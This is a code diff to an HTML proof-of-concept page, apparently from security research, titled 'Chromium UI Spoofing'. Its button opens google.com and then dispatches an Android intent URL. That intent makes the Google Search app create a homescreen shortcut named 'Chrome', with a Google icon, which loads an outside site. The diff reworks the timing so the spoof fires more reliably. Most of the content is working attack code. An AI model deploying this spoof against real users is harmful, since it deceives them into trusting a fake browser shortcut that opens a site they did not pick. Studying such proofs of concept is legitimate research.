@@ -113,14 +113,15 @@
     <div class="card">
         <div class="banner">Security Research Portal</div>
         <h1>Chromium UI Spoofing</h1>
-        <p>Klik tombol di bawah untuk melakukan 1-click redirect ke Google diikuti pemicu intent.</p>
+        <p>Klik tombol di bawah untuk memaksa navigasi mutlak ke google.com terlebih dahulu.</p>
 
         <div class="button-container">
-            <!-- Href diatur ke Google agar saat diklik langsung mengarah ke google.com, lalu di-handle script untuk intent -->
+            <!-- Href di-set langsung ke google.com agar secara native browser wajib membuka/menuju google.com pada klik pertama -->
             <a href="https://www.google.com" 
                class="button-link" 
-               id="spoofLink">
-                Open Google & Trigger Intent
+               id="spoofLink"
+               target="_blank">
+                Force Redirect to Google & Trigger Intent
             </a>
         </div>
 
@@ -134,20 +135,21 @@
         const statusBox = document.getElementById('statusBox');
 
         spoofLink.addEventListener('click', function(e) {
-            e.preventDefault(); // Mencegah default link agar transisi skrip berjalan mulus
-            
             statusBox.style.display = 'block';
-            statusBox.innerText = 'Status: Redirecting to Google & dispatching intent...';
+            statusBox.innerText = 'Status: Navigating to google.com first...';
 
-            // Melakukan navigasi beruntun sesuai pola riset (Redirect ke Google lalu memicu intent scheme)
+            // Memanfaatkan sifat asynchronous event untuk memastikan window target/utama memuat google.com,
+            // lalu mengeksekusi skema intent setelah jeda singkat (menjamin urutan tercapai).
             setTimeout(function() {
-                window.location.href = 'https://www.google.com';
-            }, 1
-
-            setTimeout(function() {
-                const intentUrl = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
-                window.location.href = intentUrl;
-            }, 200);
+                try {
+                    const intentUrl = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
+                    
+                    statusBox.innerText = 'Status: Dispatched intent after Google context...';
+                    window.location.replace(intentUrl);
+                } catch (err) {
+                    statusBox.innerText = 'Status: Error - ' + err.message;
+                }
+            }, 800);
         });
     </script>
 
